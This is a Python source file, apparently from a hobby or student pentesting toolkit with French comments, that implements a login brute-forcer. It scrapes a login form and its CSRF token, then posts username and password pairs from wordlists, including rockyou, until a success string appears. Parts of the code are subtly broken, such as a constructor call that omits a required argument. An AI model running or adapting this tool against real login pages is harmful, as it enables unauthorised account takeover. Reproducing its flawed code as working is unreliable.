from .dirb import FuzzUrl  # \o/ Merci François
from bs4 import BeautifulSoup
import requests
import re
from pathlib import Path


class BruteForcer:

    def __init__(self, url, filename, target, userlist="wordlist/users.txt", passlist="wordlist/test_pass.txt"):
        self.userlist = userlist
        self.passlist = passlist
        self.url = url
        self.filename = filename
        self.target = target
        self.session = requests.Session()

    def get_urls(self):
        s = FuzzUrl(f'{self.url}', False)
        s.dirchecker(True, True, f'{self.filename}')

    def get_html_source(self):
        with open(Path("internal_lib/results").absolute() / "output.txt", "r") as f:
            for url in f.readlines():
                html = self.session.get(url, headers={
                    "User-Agent": "Chocapic/3.0"}).content
                return BeautifulSoup(html, 'html.parser')

    def get_inputs(self):
        html_bs4 = self.get_html_source()
        html_inputs = html_bs4.findAll('input')

        return html_inputs if len(html_inputs) != 0 else False

    def get_form_action(self):
        html_bs4 = self.get_html_source()
        return html_bs4.form["action"]

    def get_csrf_values(self):
        html_bs4 = self.get_html_source()
        csrf = html_bs4.find('input', {'name': re.compile("csrf")})
        return (csrf["name"], csrf["value"]) if csrf is not None else False

    def get_form_header(self):
        r = self.session.get(self.url + self.get_form_action())
        headers = r.headers
        return headers

    def get_cookies(self):
        r = self.session.get(self.url + self.get_form_action())
        cookies = r.cookies
        return cookies

    def brute_force(self):
        global payload
        url = self.url + self.get_form_action()
        print(url)
        user_list = self.userlist
        pass_list = self.passlist
        with open(Path(f"internal_lib/{user_list}"), "r") as uf:
            for user in uf.readlines():
                with open(Path(f"internal_lib/{pass_list}"), "r") as pf:
                    for passwd in pf.readlines():
                        user = user.strip("\r\n")
                        password = passwd.strip("\r\n")
                        if self.get_csrf_values():
                            payload = {
                                self.get_csrf_values()[0]: self.get_csrf_values()[1],
                                "username": user,
                                "password": password,
                            }

                        r = self.session.post(url, payload, cookies=self.session.cookies, headers=self.session.headers)

                        if BeautifulSoup(r.content, 'html.parser').find(text=re.compile(self.target)):
                            print("\033[92mCredentials found !! ")
                            print(f'-user:{user}     -password:{passwd}')
                            return "Credentials Found !"

    def launch(self):
        # self.get_urls()
        return self.brute_force()


# -------------------------
# 1 - récuperer les champs depuis le fuzzer OK
# 2 - faire la requete en POST avec les users/ pass (users.txt et rockyou.txt)
# 3 - vérifier le retour de la requete (savoir si c'est ok ou ko)
# user admin // pass azerty

if __name__ == "__main__":
    # s = FuzzUrl('127.0.0.1:8000')
    # s.dirchecker(True, True, 'urls_to_bruteforce.txt')

    b = BruteForcer("http://127.0.0.1:8000", 'urls.txt')
    # b.get_urls()
    # print(b.get_inputs())
    # print(b.get_form_action())
    # print(b.get_csrf_values())
    # print(b.get_cookies())
    # print(b.get_form_header())
    b.brute_force()
